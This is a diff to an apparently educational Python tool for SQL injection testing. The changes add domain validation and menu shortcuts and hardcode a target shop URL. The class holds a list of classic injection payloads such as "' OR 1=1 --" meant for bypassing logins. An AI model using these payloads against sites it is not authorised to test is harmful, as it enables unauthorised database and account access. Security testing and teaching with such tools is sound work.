@@ -4,15 +4,15 @@ import json
 from tqdm import tqdm
 from rich import print
 import requests
-from components import clear_screen_and_provide_with_banner, clear_screen
+from components import clear_screen_and_provide_with_banner, clear_screen, check_is_domain_name
 from view.exploit_options import exploit_option
+from colorama import Fore, Style
 
 load_dotenv()
 
 base_url = os.environ.get("BASE_URL")
 
 class SQLInjection:
-    __url = None;
     __payloads = {
             "default": ["' OR 1=1 --", "' OR sokpheng = sopi --", "admin' or '1'='1'--", "' OR 1=1;","'OR koko=koko --"],
             "medium": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"], # read data from file
@@ -49,7 +49,7 @@ class SQLInjection:
         elif page_choice == "3":   
             print("[bold yellow]You've selected the HTTP Headers option.[/bold yellow]");
             print("=> This option is under development.. :) )")
-        elif page_choice.lower().replace(" ","") == "clear":
+        elif page_choice.lower().replace(" ","") == "clear" or page_choice.lower().replace(" ","") == "cls":
             clear_screen.clear_screen();
             self.choose_options(url);
         else:
@@ -64,7 +64,7 @@ class SQLInjection:
             
             level = str(input("Choose any payload option from 1 to 3: "))
             
-            if level == "0":
+            if level == "0" or level.lower().replace(" ", "")=="back" or level.lower().replace(" ", "")=="b":
                 clear_screen_and_provide_with_banner.start();
                 self.choose_options(url);
             elif level == "1":
@@ -126,6 +126,19 @@ class SQLInjection:
 
 
 def start_sql_injection():
-    target = str(input("[+] Target url: "));
-    clear_screen_and_provide_with_banner.start()
-    SQLInjection().choose_options("https://myshop.cstad.shop/");
+    target = "";
+    while True:
+        target = str(input("[+] Target url: "));
+        if check_is_domain_name.is_valid_domain_name(domain=target)==True:
+            clear_screen_and_provide_with_banner.start()
+            SQLInjection().choose_options("https://food.cstad.shop/");
+            # SQLInjection().choose_options(target);
+            
+            break;
+        else:
+            if target.lower().replace(" ","") == "back":
+                clear_screen_and_provide_with_banner.start()
+                break
+            elif target.lower().replace(" ","") == "https://food.cstad.shop/":
+                SQLInjection().choose_options("https://food.cstad.shop/");
+            print( "Invalid domain name, please enter again.");
